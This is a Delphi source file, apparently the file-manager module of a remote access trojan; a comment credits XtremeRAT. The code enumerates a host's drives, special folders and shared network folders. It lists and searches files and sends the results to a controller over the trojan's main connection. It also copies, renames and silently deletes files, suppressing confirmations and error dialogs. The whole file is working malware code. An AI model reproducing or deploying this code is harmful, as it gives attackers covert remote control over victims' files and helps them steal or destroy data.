unit UnitFilesManager;

interface

uses
  Windows, ShellAPI, ShlObj, ThreadUnit, UnitConstants, UnitVariables, UnitFunctions,
  UnitConnection, StreamUnit;
    
type
  TSearchFileThread = class(TThread)
  private
    StartDir, FileMask: string;
    SubDir: Boolean;
  protected
    procedure Execute; override;
  public
    constructor Create(xStartDir, xFileMask: string; xSubDir: Boolean);
  end;

var
  SearchFileThread: TSearchFileThread;
  StopSearching: Boolean;

function DeleteAllFilesAndDir(FilesOrDir: string): Boolean;
function ListDirectory(Path: string; DirOnly: Boolean): string;
function MyRenameFile_Dir(oldPath, NewPath : string): Boolean;
function CopyDirectory(const Hwd : LongWord; const SourcePath, DestPath : string): boolean;
function ListSpecialFolders: string;
function ListDrives: string; 
function ListSharedFolders: string;     

implementation

var
  SearchResults: string;
     
function ListSpecialFolders: string;
var
  i: Integer;
  TmpStr: string;
begin
  for i := 0 to 48 do
  begin
    TmpStr := GetSpecialFolder(i);
    if TmpStr <> '' then Result := Result + TmpStr + '|';
  end;
end;

function DriveVolumeName(Drive: widestring): widestring;
var
  FSSysFlags,maxCmpLen: DWord;
  pFileSystem: PWideChar;
  pVolName: PWideChar;
begin
  GetMem(pVolName, MAX_PATH);
  ZeroMemory(pVolName, MAX_PATH);
  GetVolumeInformationW(PWideChar(Drive), pVolName, MAX_PATH, nil, maxCmpLen, FSSysFlags, nil, 0);
  result := (pVolName);
  FreeMem(pVolName, MAX_PATH);
end;

function DriveAttrib(Drive: widestring): widestring;
var
  FSSysFlags, maxCmpLen: DWord;
  pFSBuf: PWideChar;
begin
  GetMem(pFSBuf, MAX_PATH);
  ZeroMemory(pFSBuf, MAX_PATH);
  GetVolumeInformationW(pWidechar(Drive), nil, 0, nil, maxCmpLen, FSSysFlags, pFSBuf, MAX_PATH);
  result := (pFSBuf);
  FreeMem(pFSBuf, MAX_PATH);
end;
 
function GetDiskFreeSpaceEx(Directory: PWideChar; var FreeAvailable,
    TotalSpace: TLargeInteger; TotalFree: PLargeInteger): Bool; stdcall;
var
  SectorsPerCluster, BytesPerSector, FreeClusters, TotalClusters: LongWord;
  Temp: Int64;
  Dir: PWideChar;
begin
  if Directory <> nil then Dir := Directory else Dir := nil;
  Result := GetDiskFreeSpaceW(Dir, SectorsPerCluster, BytesPerSector,
    FreeClusters, TotalClusters);
  Temp := SectorsPerCluster * BytesPerSector;
  FreeAvailable := Temp * FreeClusters;
  TotalSpace := Temp * TotalClusters;
end;

function DriveType(Drive: PWideChar): WideString;
begin
  case GetDriveTypeW(Drive) of
    DRIVE_REMOVABLE: Result := 'Removable';
    DRIVE_FIXED: Result := 'Fixed';
    DRIVE_REMOTE: Result := 'Remote';
    DRIVE_CDROM: Result := 'CDROM';
  else
    Result := 'Unknown';                                         
  end;
end;

function MyGetLogicalDriveStringsW(nBufferLength: DWORD;
  lpBuffer: PWideChar): DWORD; stdcall; external 'kernel32.dll' name 'GetLogicalDriveStringsW';

function ListDrives: string;
var
  pDrive, Drive: PWideChar;
  dName, dAttrib, dType: WideString;
  TmpSize, FreeSize, TotalSize: Int64;
begin
  GetMem(Drive, 10000);
  MyGetLogicalDriveStringsW(10000, Drive);
  pDrive := Drive;
  while pDrive^ <> #0 do
  begin
    dType := DriveType(pDrive);
    dName := DriveVolumeName(pDrive);
    if dName = '' then dName := 'Unknown';
    dAttrib := DriveAttrib(pDrive);
    
    TmpSize := 0;
    Totalsize := 0;
    Freesize := 0;
    GetDiskFreeSpaceEx(pDrive, TmpSize, Totalsize, @Freesize);

    Result := Result + pDrive + '|';
    Result := Result + dType + '|';
    Result := Result + dName + '|';
    Result := Result + dAttrib + '|';
    Result := Result + ByteSize(TotalSize) + '|';
    Result := Result + ByteSize(TmpSize) + '|' + #13#10;
    
    Inc(pDrive, 4);
  end;
end;

function EnumFuncLAN(NetResource: PNetResource): string;
var
  Enum: THandle;
  Count, BufferSize: DWORD;
  Buffer: array[0..16384 div SizeOf(TNetResource)] of TNetResource;
  i: Integer;
begin
  Result := '';
  if WNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, NetResource, Enum) = NO_ERROR then
  try
    Count := $FFFFFFFF;
    BufferSize := SizeOf(Buffer);
    while WNetEnumResource(Enum, Count, @Buffer, BufferSize) = NO_ERROR do
    for i := 0 to Count - 1 do
    begin
      if Buffer[i].dwType = RESOURCETYPE_DISK then
        Result := Result + Buffer[i].lpRemoteName + '|';
      if (Buffer[i].dwUsage and RESOURCEUSAGE_CONTAINER) > 0 then
        Result := Result + EnumFuncLan(@Buffer[i]);
    end;
  finally
    WNetCloseEnum(Enum);
  end;
end;

function ListSharedFolders: string;
begin
  Result := EnumFuncLAN(nil);
end;

function ListDirectory(Path: string; DirOnly: Boolean): string;
var
  DirList, FilesList: string;
  DirStream, FilesStream: TMemoryStream;
  FindData: TWin32FindData;
  hFind: THandle;
begin
  DirList := '';
  FilesList := '';
  if Path = '' then Exit;
  if Path[Length(Path)] <> '\' then Path := Path + '\';
  Path := Path + '*.*';

  DirStream := TMemoryStream.Create;
  FilesStream := TMemoryStream.Create;

  hFind := FindFirstFile(PChar(Path), FindData);
  if hFind = INVALID_HANDLE_VALUE then Exit;

  if FindData.dwFileAttributes and $00000010 <> 0 then
    DirStream.WriteBuffer(FindData, SizeOf(TWin32FindData))
  else FilesStream.WriteBuffer(FindData, SizeOf(TWin32FindData));

  while FindNextFile(hFind, FindData) do
  begin
    if FindData.dwFileAttributes and $00000010 <> 0 then
      DirStream.WriteBuffer(FindData, SizeOf(TWin32FindData))
    else FilesStream.WriteBuffer(FindData, SizeOf(TWin32FindData));
  end;

  Windows.FindClose(hFind);

  DirList := StreamToStr(DirStream);
  DirStream.Free;
  FilesList := StreamToStr(FilesStream);
  FilesStream.Free;

  if DirOnly then Result := DirList else Result := FilesList;
end;

procedure SearchFiles(StartDir, FileMask: string; SubDir: Boolean);
var
  sRec: TSearchRec;
  Path: string;
begin
  if StopSearching then Exit;
  Path := StartDir;
  if Path[length(Path)] <> '\' then Path := Path + '\';
  if FindFirst(Path + FileMask, faAnyFile - faDirectory, sRec) = 0 then
  try
    repeat
      if StopSearching then Break;
      SearchResults := SearchResults + sRec.Name + '|' +  Path + '|' +
                      ByteSize(MyGetFileSize(Path + sRec.Name)) + '|' + DELIMITER;
    until FindNext(sRec) <> 0;
  finally
    FindClose(sRec);
  end;
  
  if not SubDir then Exit;

  if FindFirst(Path + '*.*', faDirectory, sRec) = 0 then 
  try
    repeat
      if ((sRec.Attr and faDirectory) <> 0) and (sRec.Name <> '.') and (sRec.Name <> '..') then
        SearchFiles(Path + sRec.Name, FileMask, True);
    until FindNext(sRec) <> 0;
  finally
    FindClose(sRec);
  end;
end;
       
function MySHFileOperation(const lpFileOp: TSHFileOpStruct): Integer;
var
  xSHFileOperation: function(const lpFileOp: TSHFileOpStruct): Integer; stdcall;
begin
  xSHFileOperation := GetProcAddress(LoadLibrary(pchar('shell32.dll')), pchar('SHFileOperationA'));
  Result := xSHFileOperation(lpFileOp);
end;

function CopyDirectory(const Hwd : LongWord; const SourcePath, DestPath : string): boolean;
var
  OpStruc: TSHFileOpStruct;
  frombuf, tobuf: Array [0..128] of Char;
begin
  Result := false;
  FillChar( frombuf, Sizeof(frombuf), 0 );
  FillChar( tobuf, Sizeof(tobuf), 0 );
  StrPCopy( frombuf,  SourcePath);
  StrPCopy( tobuf,  DestPath);

  with OpStruc dO
  begin
    Wnd := Hwd;
    wFunc := FO_COPY;
    pFrom := @frombuf;
    pTo :=@tobuf;
    fFlags := FOF_NOCONFIRMATION or FOF_RENAMEONCOLLISION;
    fAnyOperationsAborted:= False;
    hNameMappings:= Nil;
    lpszProgressTitle:= Nil;
  end;

  if myShFileOperation(OpStruc) = 0 then Result := true;
end;
           
function DeleteAllFilesAndDir(FilesOrDir: string): boolean;
var
  F: TSHFileOpStruct;
  From: string;
  Resultval: integer;
begin
  FillChar(F, SizeOf(F), #0);
  From := FilesOrDir + #0;
  try
    F.wnd := 0;
    F.wFunc := FO_DELETE;
    F.pFrom := PChar(From);
    F.pTo := nil;
    F.fFlags := F.fFlags or FOF_NOCONFIRMATION or FOF_SIMPLEPROGRESS or
                FOF_FILESONLY or FOF_NOERRORUI;
    F.fAnyOperationsAborted := False;
    F.hNameMappings := nil;
    Resultval := MyShFileOperation(F);
    Result := (ResultVal = 0);
  finally
  end;
end;

function MyRenameFile_Dir(oldPath, NewPath : string): Boolean;
begin
  if oldPath = NewPath then Result := False else
    Result := movefile(pchar(OldPath), pchar(NewPath));
end;

//From XtremeRAT
constructor TSearchFileThread.Create(xStartDir, xFileMask: string; xSubDir: Boolean);
begin            
  inherited Create(True);
  StartDir := xStartDir;
  FileMask := xFileMask;
  SubDir := xSubDir;
end;

procedure TSearchFileThread.Execute;
begin
  StopSearching := True;
  Sleep(100);
  StopSearching := False;
  SearchResults := '';
  SearchFiles(StartDir, FileMask, SubDir);
  StopSearching := True;

  SendDatas(MainConnection, FILESMANAGER + '|' + FILESSEARCHFILE + '|' + SearchResults);
  SearchResults := '';
end;

end.
